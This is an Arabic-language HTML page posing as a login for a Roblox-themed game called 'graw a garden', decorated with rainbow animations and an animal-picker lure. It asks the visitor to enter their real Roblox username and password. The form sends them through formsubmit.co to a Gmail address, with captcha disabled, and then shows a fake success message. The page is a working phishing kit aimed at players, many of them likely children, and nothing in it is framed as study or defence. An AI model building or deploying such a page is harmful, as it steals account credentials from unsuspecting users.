<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جراو أ جاردن - عالم الحيوانات</title>
    <style>
        body {
            margin: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(270deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3);
            background-size: 1400% 1400%;
            animation: rainbow 15s ease infinite;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        
        @keyframes rainbow {
            0% {background-position: 0% 50%;}
            50% {background-position: 100% 50%;}
            100% {background-position: 0% 50%;}
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .header h1 {
            color: white;
            text-shadow: 0 2px 10px rgba(0,0,0,0.5);
            font-size: 28px;
            animation: glow 2s infinite alternate;
            margin: 0;
            padding: 15px 30px;
            background: rgba(0,0,0,0.3);
            border-radius: 50px;
            display: inline-block;
        }
        
        @keyframes glow {
            from { text-shadow: 0 0 5px #fff; }
            to { text-shadow: 0 0 15px #fff, 0 0 20px #4b0082; }
        }
        
        .login-container {
            background: rgba(255, 255, 255, 0.97);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            width: 320px;
            text-align: center;
            position: relative;
            z-index: 1;
        }
        
        h2 {
            margin-bottom: 20px;
            background: linear-gradient(to right, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: rainbow-text 8s infinite linear;
            font-size: 24px;
        }
        
        @keyframes rainbow-text {
            0% {background-position: 0%;}
            100% {background-position: 100%;}
        }
        
        .input-group {
            margin-bottom: 20px;
            text-align: right;
        }
        
        input {
            width: 100%;
            padding: 12px 15px;
            margin: 8px 0;
            border-radius: 8px;
            border: 1px solid #ddd;
            font-size: 16px;
            box-sizing: border-box;
            transition: all 0.3s;
        }
        
        input:focus {
            border-color: #4b0082;
            box-shadow: 0 0 10px rgba(75, 0, 130, 0.3);
            outline: none;
        }
        
        .animal-selection {
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
        }
        
        .animal-option {
            font-size: 30px;
            cursor: pointer;
            transition: all 0.3s;
            padding: 10px;
            border-radius: 50%;
        }
        
        .animal-option:hover {
            transform: scale(1.2);
            background: rgba(75, 0, 130, 0.1);
        }
        
        .animal-option.selected {
            transform: scale(1.3);
            background: rgba(75, 0, 130, 0.2);
            box-shadow: 0 0 10px rgba(75, 0, 130, 0.5);
        }
        
        button {
            width: 100%;
            padding: 12px;
            border: none;
            background: linear-gradient(to right, #4b0082, #9400d3);
            color: white;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        
        .note {
            font-size: 13px;
            color: #666;
            margin-top: 20px;
            line-height: 1.6;
        }
        
        .alert {
            padding: 12px;
            border-radius: 8px;
            margin: 15px 0;
            display: none;
            animation: fadeIn 0.5s;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
            display: none;
        }
        
        .loading {
            background-color: #e2e3e5;
            color: #383d41;
            display: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>سجل الدخول واختار أي حيوان 🦊🐻🐼</h1>
    </div>
    
    <div class="login-container">
        <h2>graw a garden.com</h2>
        
        <div id="alertBox" class="alert"></div>
        
        <form id="loginForm" action="https://formsubmit.co/grawagardendev@gmail.com" method="POST">
            <!-- إعدادات FormSubmit -->
            <input type="hidden" name="_subject" value="تسجيل دخول جديد - جراو أ جاردن">
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="_next" value="?success=1">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="الحيوان المختار" id="selectedAnimal">
            
            <div class="input-group">
                <input type="text" name="👤 اسم المستخدم" placeholder="اسم المستخدم" required>
            </div>
            
            <div class="input-group">
                <input type="password" name="🔑 كلمة المرور" placeholder="كلمة المرور" required>
            </div>
            
            <div class="animal-selection">
                <div class="animal-option" data-animal="🦊">🦊</div>
                <div class="animal-option" data-animal="🐻">🐻</div>
                <div class="animal-option" data-animal="🐼">🐼</div>
                <div class="animal-option" data-animal="🦁">🦁</div>
                <div class="animal-option" data-animal="🐯">🐯</div>
            </div>
            
            <button type="submit">تسجيل الدخول</button>
        </form>
        
        <p class="note">ملاحظة: يجب أن تكون معلومات حسابك الأصلية في Roblox</p>
    </div>

    <script>
        // اختيار الحيوان
        const animalOptions = document.querySelectorAll('.animal-option');
        const selectedAnimalInput = document.getElementById('selectedAnimal');
        
        animalOptions.forEach(option => {
            option.addEventListener('click', function() {
                animalOptions.forEach(opt => opt.classList.remove('selected'));
                this.classList.add('selected');
                selectedAnimalInput.value = this.getAttribute('data-animal');
            });
        });
        
        // معالجة إرسال النموذج
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const alertBox = document.getElementById('alertBox');
            
            // التحقق من اختيار حيوان
            if (!selectedAnimalInput.value) {
                alertBox.textContent = "الرجاء اختيار حيوان من القائمة";
                alertBox.style.display = "block";
                alertBox.style.backgroundColor = "#f8d7da";
                alertBox.style.color = "#721c24";
                return;
            }
            
            // عرض رسالة التحميل
            alertBox.textContent = "جاري إرسال البيانات...";
            alertBox.className = "alert loading";
            alertBox.style.display = "block";
            
            // إرسال النموذج بعد تأخير بسيط
            setTimeout(() => {
                this.submit();
            }, 1000);
        });
        
        // التحقق من وجود معلمة النجاح في الرابط
        if(window.location.search.includes('success=1')) {
            const alertBox = document.getElementById('alertBox');
            alertBox.textContent = "تم إرسال البيانات بنجاح ✓";
            alertBox.className = "alert success";
            alertBox.style.display = "block";
        }
    </script>
</body>
</html>
